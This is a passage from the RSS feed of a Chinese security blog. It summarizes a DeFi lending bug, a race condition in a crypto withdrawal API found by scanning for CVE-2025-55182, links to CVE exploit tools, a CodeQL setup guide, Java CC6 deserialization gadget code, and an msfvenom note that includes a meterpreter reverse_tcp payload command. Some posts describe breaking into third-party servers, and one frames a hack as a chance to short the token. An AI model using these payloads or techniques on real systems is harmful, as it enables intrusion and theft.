&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;以上cook函数实现功能如下，输入一个actions列表，依次执行action，执行全部结束后检查调用者是否破产，若破产，reverte.&lt;/p&gt;
&lt;h1 id=&#34;问题&#34;&gt;问题
&lt;/h1&gt;&lt;p&gt;该版本Cauldron cook函数新增了else判断，使用了function_additionalCookAction以兼容后续更新,若调用者传入不存在的action时，走虚函数返回returnStatus为false，导致无需进行破产检查。因此可以输入actions=[Action.Borrow,任意不存在的action] 即可借出全部资产。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>某加密货币预测市场提现接口漏洞</title>
        <link>https://byebydoggy.github.io/post/2025/%E6%9F%90%E5%8A%A0%E5%AF%86%E8%B4%A7%E5%B8%81%E9%A2%84%E6%B5%8B%E5%B8%82%E5%9C%BA%E6%8F%90%E7%8E%B0%E6%8E%A5%E5%8F%A3%E6%BC%8F%E6%B4%9E/</link>
        <pubDate>Thu, 18 Dec 2025 18:20:44 +0800</pubDate>
        
        <guid>https://byebydoggy.github.io/post/2025/%E6%9F%90%E5%8A%A0%E5%AF%86%E8%B4%A7%E5%B8%81%E9%A2%84%E6%B5%8B%E5%B8%82%E5%9C%BA%E6%8F%90%E7%8E%B0%E6%8E%A5%E5%8F%A3%E6%BC%8F%E6%B4%9E/</guid>
        <description>&lt;img src="https://byebydoggy.github.io/cover.png" alt="Featured image of post 某加密货币预测市场提现接口漏洞" /&gt;&lt;h1 id=&#34;思路&#34;&gt;思路
&lt;/h1&gt;&lt;p&gt;CVE-2025-55182发布后随机扫描区块链项目方，偶然发现这个小项目方。 进入服务器发现Next.js框架仅用于SSR渲染前端页面，没啥用处。获取到后端API地址以后，扫描后端端口及目录，发现swagger API，其中具有提现接口，然而调用时似乎缺少参数，于是分析前端打包后的代码，参数中包含提现目的地址和提现数量，简单试了下大数，小数，负数，科学计数法等等发现单次调用都会报错，所以应该是没有溢出问题，并发发起调用请求时可以多次提现，导致余额为负数。&lt;/p&gt;
&lt;p&gt;该漏洞本质还是Web漏洞，项目方修复速度很快，&lt;del&gt;点赞&lt;/del&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>1207 Msfvenom踩坑</title>
        <link>https://byebydoggy.github.io/post/2025/1207-msfvenom%E8%B8%A9%E5%9D%91/</link>
        <pubDate>Sun, 07 Dec 2025 15:18:37 +0800</pubDate>
        
        <guid>https://byebydoggy.github.io/post/2025/1207-msfvenom%E8%B8%A9%E5%9D%91/</guid>
        <description>&lt;img src="https://byebydoggy.github.io/cover.png" alt="Featured image of post 1207 Msfvenom踩坑" /&gt;&lt;h1 id=&#34;问题&#34;&gt;问题
&lt;/h1&gt;&lt;p&gt;在Jiaosu powershell下生成的payload文件传递给受害机后发现始终无法联通，查看payload文件发现为data类型(file payload)&lt;/p&gt;
&lt;h1 id=&#34;原因&#34;&gt;原因
&lt;/h1&gt;&lt;p&gt;来自豆包&lt;/p&gt;
&lt;p&gt;从 &lt;code&gt;msfvenom&lt;/code&gt; 生成 ELF 文件却识别为 &lt;code&gt;data&lt;/code&gt;、无法执行的核心原因，是 &lt;strong&gt;Windows PowerShell 重定向输出时的编码 / 格式污染&lt;/strong&gt; （而非文件完整性 / 架构问题）——PowerShell 的 &lt;code&gt;&amp;gt;&lt;/code&gt; 重定向默认会以「文本模式」处理输出，破坏 ELF 二进制文件的原始字节结构，导致文件变成无效的 &lt;code&gt;data&lt;/code&gt; 格式。&lt;/p&gt;
&lt;h3 id=&#34;一根本原因powershell-文本重定向污染二进制文件&#34;&gt;一、根本原因：PowerShell 文本重定向污染二进制文件
&lt;/h3&gt;&lt;p&gt;Linux 的 ELF 是纯二进制格式，而 Windows PowerShell 的 &lt;code&gt;&amp;gt;&lt;/code&gt; 本质是 &lt;code&gt;Out-File&lt;/code&gt; 命令，默认：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;采用 &lt;code&gt;Unicode/UTF-16&lt;/code&gt; 编码（而非二进制）；&lt;/li&gt;
&lt;li&gt;会自动转换换行符（&lt;code&gt;\n&lt;/code&gt;→&lt;code&gt;\r\n&lt;/code&gt;）、添加 BOM 头；&lt;/li&gt;
&lt;li&gt;截断 / 修改非文本字节，直接破坏 ELF 文件的魔数（&lt;code&gt;0x7f 45 4c 46&lt;/code&gt;）和结构。
即便 SHA 值 “一致”，也可能是你在 Windows 本地校验的是被污染后的文件，而非传输到 Linux 后的版本。&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;解决办法&#34;&gt;解决办法
&lt;/h1&gt;&lt;h4 id=&#34;直接在-linux-环境生成推荐无格式问题&#34;&gt;直接在 Linux 环境生成（推荐，无格式问题）
&lt;/h4&gt;&lt;h4 id=&#34;windows-下用-cmdexe-替代-powershell-生成&#34;&gt;Windows 下用 cmd.exe 替代 PowerShell 生成
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;# 打开cmd.exe（非PowerShell），执行以下命令
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=8848 -f elf -o shell_x64.elf
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;⚠️ 注意：必须用 &lt;code&gt;-o&lt;/code&gt; 参数（指定输出文件），而非 &lt;code&gt;&amp;gt;&lt;/code&gt; 重定向 ——&lt;code&gt;msfvenom&lt;/code&gt; 的 &lt;code&gt;-o&lt;/code&gt; 本身就是二进制写入，比重定向更可靠。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>CVE-2025-55182</title>
        <link>https://byebydoggy.github.io/post/2025/cve-2025-55182/</link>
        <pubDate>Fri, 05 Dec 2025 19:31:10 +0800</pubDate>
        
        <guid>https://byebydoggy.github.io/post/2025/cve-2025-55182/</guid>
        <description>&lt;img src="https://byebydoggy.github.io/cover.png" alt="Featured image of post CVE-2025-55182" /&gt;&lt;h1 id=&#34;nuclei&#34;&gt;nuclei
&lt;/h1&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;&#34; &gt;nuclei模板&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;gui利用工具&#34;&gt;GUI利用工具
&lt;/h1&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/Malayke/Next.js-RSC-RCE-Scanner-CVE-2025-66478&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;github工具&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;poc&#34;&gt;POC
&lt;/h1&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://gist.github.com/maple3142/48bc9393f45e068cf8c90ab865c0f5f3&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;github&lt;/a&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>项目环境配置 限定版本的必要性</title>
        <link>https://byebydoggy.github.io/post/2025/%E9%A1%B9%E7%9B%AE%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE-%E9%99%90%E5%AE%9A%E7%89%88%E6%9C%AC%E7%9A%84%E5%BF%85%E8%A6%81%E6%80%A7/</link>
        <pubDate>Mon, 24 Nov 2025 09:55:52 +0800</pubDate>
        
        <guid>https://byebydoggy.github.io/post/2025/%E9%A1%B9%E7%9B%AE%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE-%E9%99%90%E5%AE%9A%E7%89%88%E6%9C%AC%E7%9A%84%E5%BF%85%E8%A6%81%E6%80%A7/</guid>
        <description>&lt;img src="https://byebydoggy.github.io/cover.png" alt="Featured image of post 项目环境配置 限定版本的必要性" /&gt;&lt;h1 id=&#34;正文&#34;&gt;正文
&lt;/h1&gt;&lt;p&gt;想象一下，项目环境中同时引入了Conda包管理和pip包管理，某个依赖A 2.0需要2.0版本的C，而某个依赖B需要1.0版本的C，若先用conda安装了B，后用pip安装A，Conda会自动重新安装低版本的C，循环往复。&lt;/p&gt;
&lt;p&gt;再想象一下某个组件需要的低级组件只能在3.7python中使用，那都是什么年代的产物了，必然安装不了了。&lt;/p&gt;
&lt;p&gt;以上内容均发生在hummingbot打包发布阶段，原项目组的包根本无法正常使用，其中版本限定宽松，&lt;/p&gt;
&lt;p&gt;默认会使用python313，部分老旧库无法运行，且引入了未被使用的过时依赖，每次打包还需要编译C文件，折腾了很久，肥肠之痛苦。&lt;/p&gt;
&lt;p&gt;对于wheel安装若无版本限定，依据pip依赖回溯规则，会尝试全部包版本的组合尝试，费事费力费流量。因此以后务必在发布包之前写好版本限定，应当严格限定可以运行的最低版本号组合，以及至少限定不高于当前大版本的版本号，以避免大版本破环性更新。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>2025 11 23 Port3 Hack</title>
        <link>https://byebydoggy.github.io/post/2025/2025-11-23-port3-hack/</link>
        <pubDate>Sun, 23 Nov 2025 13:56:21 +0800</pubDate>
        
        <guid>https://byebydoggy.github.io/post/2025/2025-11-23-port3-hack/</guid>
        <description>&lt;img src="https://byebydoggy.github.io/cover.png" alt="Featured image of post 2025 11 23 Port3 Hack" /&gt;&lt;h1 id=&#34;evm-trackoor检测规则&#34;&gt;EVM-Trackoor检测规则
&lt;/h1&gt;&lt;p&gt;2025-11-23-04:56监控Mint地址0x000000&amp;hellip;.00转移10亿port3代币(3000W $)到黑客地址0xb13A503dA5f368E48577c87b5d5AeC73d08f812E&lt;/p&gt;
&lt;p&gt;hash:0x34c17a91b2f2ccd5973ecd49c20cc3c0939c5d8eaeeb740e9dec97fb1345e1da&lt;/p&gt;
&lt;h1 id=&#34;漏洞原理&#34;&gt;漏洞原理
&lt;/h1&gt;&lt;p&gt;Port3 bridgeIn正常调用时要求调用者存入代币和铸造的Port3代币价值相等，黑客利用可能缺失对铸造请求的签名校验、无重复请求拦截机制，或是未绑定合法铸造的权限地址白名单” 导致了0存入而大额铸造的漏洞。&lt;/p&gt;
&lt;h1 id=&#34;获利机会&#34;&gt;获利机会
&lt;/h1&gt;&lt;p&gt;4：56分监控到异常转移，5:05分黑客抛售，有10分钟做空空间，包含币安合约。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>DevEnvSetting Docker</title>
        <link>https://byebydoggy.github.io/post/2025/devenvsetting-docker/</link>
        <pubDate>Sun, 23 Nov 2025 01:08:52 +0800</pubDate>
        
        <guid>https://byebydoggy.github.io/post/2025/devenvsetting-docker/</guid>
        <description>&lt;img src="https://byebydoggy.github.io/cover.png" alt="Featured image of post DevEnvSetting Docker" /&gt;&lt;h1 id=&#34;引言&#34;&gt;引言
&lt;/h1&gt;&lt;p&gt;最近正在完善Hummingbot回测模块，因为需要联动Dashboard，api，api-client多个模块，底层依赖hummingbot主库，需要本地打包hummingbot。而原项目使用conda及pip作为包管理，之前一直是本地pip虚拟环境安装库开发，环境管理相对复杂。刚刚偶然发现可以直接使用pycharm内置的一个小功能&amp;mdash;使用已构建的docker容器中环境进行开发。&lt;/p&gt;
&lt;h1 id=&#34;操作&#34;&gt;操作
&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;添加新的解释器&lt;/li&gt;
&lt;li&gt;选择Docker或者Docker-Compose(没啥区别，选择dockerfile可以选择每次重新构建)&lt;/li&gt;
&lt;li&gt;按照步骤选择，最终需要选择Dockerfile中的虚拟环境路径。&lt;/li&gt;
&lt;li&gt;至此可以直接使用Docker完成开发环境构建，Clone下来的项目如果有docker文件可以直接无痛启动开发环境了。&lt;/li&gt;
&lt;/ol&gt;
</description>
        </item>
        <item>
        <title>CodeQL 1</title>
        <link>https://byebydoggy.github.io/post/2025/codeql-1/</link>
        <pubDate>Fri, 21 Nov 2025 16:12:01 +0800</pubDate>
        
        <guid>https://byebydoggy.github.io/post/2025/codeql-1/</guid>
        <description>&lt;img src="https://byebydoggy.github.io/cover.png" alt="Featured image of post CodeQL 1" /&gt;&lt;h1 id=&#34;环境安装&#34;&gt;环境安装
&lt;/h1&gt;&lt;p&gt;CodeQL-Cli&lt;/p&gt;
&lt;p&gt;闭源&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/github/codeql-cli-binaries&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/github/codeql-cli-binaries&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;CodeQL&lt;/p&gt;
&lt;p&gt;开源规则库&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/github/codeql&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/github/codeql&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;环境变量设置&lt;/p&gt;
&lt;p&gt;设置为code-cli文件夹位置&lt;/p&gt;
&lt;p&gt;VSCode插件&lt;/p&gt;
&lt;p&gt;设置CodeQL-Cli的code.exe位置&lt;/p&gt;
&lt;h1 id=&#34;创建ql数据库&#34;&gt;创建QL数据库
&lt;/h1&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;codeql database create ./codeql-db &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;  --language&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;java &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;  --command&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;mvn clean compile&amp;#34;&lt;/span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;# 或 ./gradlew compileJava（Gradle 项目）&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;编写ql规则&#34;&gt;编写QL规则
&lt;/h1&gt;&lt;p&gt;新建detect.ql文件&lt;/p&gt;
&lt;p&gt;示例内容&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/**
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; * 目标：检测代码中初始化 InvokerTransformer 的位置（CC 链核心组件）
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;import java
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;from int x, int y, int z
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;where x in &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;1..10&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; and y in &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;1..10&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; and z in &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;1..10&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; and
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      x*x + y*y &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; z*z
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;select&lt;/span&gt; x, y, z
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;可能踩坑&#34;&gt;可能踩坑
&lt;/h1&gt;&lt;p&gt;需要创建qlback.yml配置文件&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;name&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;detect-invoker&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;version&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;0.0.1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;dependencies&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;codeql/java-all&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;*&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;否则会报错Failed to run query: ERROR: could not resolve module java&lt;/p&gt;
&lt;h1 id=&#34;执行查询&#34;&gt;执行查询
&lt;/h1&gt;&lt;p&gt;可以在命令行执行&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;codeql query run --database=./cc6-db --search-path=E:\tools\CodeQL\codeql ./detect-invoker.ql
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;或者在VsCode插件中执行&lt;/p&gt;
&lt;h1 id=&#34;参考文档&#34;&gt;参考文档
&lt;/h1&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://codeql.github.com/docs&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://codeql.github.com/docs&lt;/a&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>JavaSec CC6</title>
        <link>https://byebydoggy.github.io/post/2025/javasec-cc6/</link>
        <pubDate>Fri, 21 Nov 2025 11:45:25 +0800</pubDate>
        
        <guid>https://byebydoggy.github.io/post/2025/javasec-cc6/</guid>
        <description>&lt;img src="https://byebydoggy.github.io/cover.png" alt="Featured image of post JavaSec CC6" /&gt;&lt;h1 id=&#34;环境&#34;&gt;环境
&lt;/h1&gt;&lt;p&gt;CC6无jdk限制，本次使用jdk8u472，common-collections要求3.2.1&lt;/p&gt;
&lt;p&gt;3.2.1源码&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://maven.aliyun.com/repository/public/commons-collections/commons-collections/3.2.1/commons-collections-3.2.1-sources.jar&#34;  title=&#34;CommonCollections源码&#34;
     target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://maven.aliyun.com/repository/public/commons-collections/commons-collections/3.2.1/commons-collections-3.2.1-sources.jar&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;transformers&#34;&gt;Transformers
&lt;/h1&gt;&lt;p&gt;Transformer基类具有transform接口&lt;/p&gt;
&lt;p&gt;ChainedTransform(Transformer[]).transform 对于自身所持有的transformer对象依次调用transform方法，并将调用返回结果作为下一次调用的参数&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; Object &lt;span style=&#34;color:#a6e22e&#34;&gt;transform&lt;/span&gt;(Object object) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; iTransformers.&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        object &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; iTransformers&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;i&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;transform&lt;/span&gt;(object);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; object;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ConstantTransformer.transform 直接返回构造参数&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;public ConstantTransformer(Object constantToReturn) {
        super();
        iConstant = constantToReturn;
    }

public Object transform(Object input) {
    return iConstant;
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;InvokeTransformer.transform 通过反射调用input类的特定方法&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;InvokerTransformer&lt;/span&gt;(String methodName, Class&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; paramTypes, Object&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; args) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;super&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        iMethodName &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; methodName;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        iParamTypes &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; paramTypes;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        iArgs &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; args;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; Object &lt;span style=&#34;color:#a6e22e&#34;&gt;transform&lt;/span&gt;(Object input) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (input &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Class cls &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; input.&lt;span style=&#34;color:#a6e22e&#34;&gt;getClass&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Method method &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; cls.&lt;span style=&#34;color:#a6e22e&#34;&gt;getMethod&lt;/span&gt;(iMethodName, iParamTypes);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; method.&lt;span style=&#34;color:#a6e22e&#34;&gt;invoke&lt;/span&gt;(input, iArgs);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    } &lt;span style=&#34;color:#66d9ef&#34;&gt;catch&lt;/span&gt; (NoSuchMethodException ex) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;throw&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; FunctorException(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;InvokerTransformer: The method &amp;#39;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; iMethodName &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#39; on &amp;#39;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; input.&lt;span style=&#34;color:#a6e22e&#34;&gt;getClass&lt;/span&gt;() &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#39; does not exist&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    } &lt;span style=&#34;color:#66d9ef&#34;&gt;catch&lt;/span&gt; (IllegalAccessException ex) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;throw&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; FunctorException(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;InvokerTransformer: The method &amp;#39;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; iMethodName &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#39; on &amp;#39;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; input.&lt;span style=&#34;color:#a6e22e&#34;&gt;getClass&lt;/span&gt;() &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#39; cannot be accessed&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    } &lt;span style=&#34;color:#66d9ef&#34;&gt;catch&lt;/span&gt; (InvocationTargetException ex) {
